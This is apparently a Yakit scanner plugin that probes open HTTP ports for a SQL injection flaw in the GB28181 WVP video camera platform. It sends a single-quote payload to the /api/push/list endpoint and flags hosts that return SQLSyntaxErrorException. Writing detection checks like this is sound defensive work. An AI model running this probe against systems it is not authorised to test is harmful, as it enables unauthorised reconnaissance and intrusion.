# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /api/push/list?page=1&count=15&query=1%27&pushing=&mediaServerId= HTTP/1.1
Host: {{params(target)}}
Accept: application/json, text/plain, */*

`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )

    if str.MatchAllOfSubString(rsp, `SQLSyntaxErrorException`){
        yakit.Info("%v found GB28181摄像头管理平台WVP视频平台SQL注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("GB28181摄像头管理平台WVP视频平台SQL注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("GB28181摄像头管理平台WVP视频平台SQL注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
